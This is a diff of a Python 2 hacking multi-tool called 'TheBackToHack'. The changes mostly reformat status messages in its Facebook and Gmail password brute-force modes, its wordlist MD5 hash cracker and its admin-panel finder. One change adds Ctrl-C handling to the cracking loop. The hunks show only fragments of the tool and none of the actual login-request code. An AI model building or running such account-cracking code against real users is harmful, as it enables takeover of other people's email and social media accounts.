@@ -1,4 +1,5 @@
 #!/usr/bin/python
+
 """
 		                        [+]> Welcome To TheBackToHack <[+]
 ||---------------------------------------------------------------------------------------------------------||
@@ -20,7 +21,9 @@
 || And Tell Me What The Problem Is :)									   ||
 ||												           ||
 ||---------------------------------------------------------------------------------------------------------||
+
 """
+
 import optparse,os,socket,time
 ver = "4.0"
 #################################################### Tool Options ####################################################
@@ -504,11 +507,11 @@ def Main():
 					 except:
 					 	print("\n[!]>["+passw+"]< File Not Found !")
 						exit()
-		 			 print("\n[*]website>: www.facebook.com ")
+		 			 print("\n[*]:website: [ www.facebook.com ]")
 		 		         time.sleep(1)
-		 			 print("\n[+]Target Email>: "+str(user))
+		 			 print("\n[+]:Target Email: [ "+str(user)+" ]")
 		 		         time.sleep(1.2)
-		 			 print("\n[@]Wordlist>: "+str(passw))
+		 			 print("\n[@]:Wordlist: [ "+str(passw)+" ]")
 		 			 time.sleep(1)
 		 			 print("=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=")
 		 			 time.sleep(1.1)
@@ -566,11 +569,11 @@ def Main():
 					 except:
 					       print("\n[!]the [ "+passwordlist+" ] File Not Found!")
 					       exit()
-		 			 print("\n\n[*]website>: www.gmail.com ")
+		 			 print("\n\n[*]:website: [ www.gmail.com ]")
 		 		         time.sleep(1)
-		 			 print("\n[+]Target Email>: "+str(target))
+		 			 print("\n[+]:Target Email: [ "+str(target)+" ]")
 		 		         time.sleep(1.2)
-		 			 print("\n[@]Wordlist>: "+str(passwordlist))
+		 			 print("\n[@]:Wordlist: [ "+str(passwordlist)+" ]")
 		 			 time.sleep(1)
 		 			 print("=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=")
 		 			 time.sleep(1.1)
@@ -606,9 +609,9 @@ def Main():
 			except:
 			      print("\n[!]the [ "+pwfile+" ] File Not Found!")
 			      exit()
-		 	print("\n\n[*]MD5-HASH>: "+str(pass_in))
+		 	print("\n\n[*]:MD5-HASH: [ "+str(pass_in)+" ]")
 		        time.sleep(1.5)
-		        print("\n[@]Wordlist>: "+str(pwfile))
+		        print("\n[@]:Wordlist: [ "+str(pwfile)+" ]")
 	                time.sleep(1)
 		 	print("=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=")
 		 	time.sleep(1.2)
@@ -616,11 +619,16 @@ def Main():
 		  	time.sleep(0.8)
 			for passw in passs:
 				filemd5 = md5.new(passw.strip()).hexdigest()
-				print('[!]Trying password:[%s--[%s ')%(loo, passw.strip())
-				loo +=1
-				if pass_in == filemd5:
-				    print("\n\n[*]MD5 found >> Password is :> %s")%(passw)
-				    break;
+				try:
+				   print('[!]Trying password:[%s--[%s ')%(loo, passw.strip())
+				   loo +=1
+				   if pass_in == filemd5:
+				      print("\n\n[*]MD5 found >> Password is :> %s")%(passw)
+				      break;
+				except KeyboardInterrupt:
+					print("\n[!]Exiting.......")
+					time.sleep(2)
+					exit()
 			else:
 			    print("\n\n[!]The Password Is Not Found in [ "+str(pwfile)+" ] File!\n[*]Try Other Wordlist File :)")
 			    exit()
@@ -642,7 +650,7 @@ def Main():
 
 				       print("\n\n[*]:Target: [ "+TARGET+" ]")
 				       time.sleep(1)
-				       print("\n[*]:Links list: [ wordlist.lst ]")
+				       print("\n[@]:Links list: [ wordlist.lst ]")
 	                               time.sleep(1.1)
 			               print("-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=--=")
 				       time.sleep(1.1)
@@ -674,11 +682,11 @@ def Main():
 						     print("\n[+] CP[%s] Found! => "%(loob) + request_link)
 						     loob +=1
                            finderCP()
-		     
+
 	                elif check10 == False:
                                              print("\n[!]Ops: Your Not Connect to the internet!\n[*]Please Connect to the internet and try again :)")
                                              exit()
-					      
+
 		elif options.update:
 		     try:
 			import subprocess
@@ -703,13 +711,13 @@ def Main():
 		     print("\n[*]Update in progress.....")
 		     time.sleep(2)
 		     if update() == 1:
-				print("\n[*]TheBackToHack is Already up-to-date.")
+				print("\n[*]:TheBackToHack is Already up-to-date.")
 				exit()
 		     elif update() == -1:
-				print("\n[*]TheBackToHack experienced an error while updating, please download manually from: {}".format(toolink))
+				print("\n[*]:TheBackToHack experienced an error while updating, please download manually from: {}".format(toolink))
 				exit()
 	             elif update() == 0:
-			 	print("\n[*]TheBackToHack has successfully updated to the latest version.")
+			 	print("\n[*]:TheBackToHack has successfully updated to the latest version.")
 			 	exit()
 		     else:
 			 pass
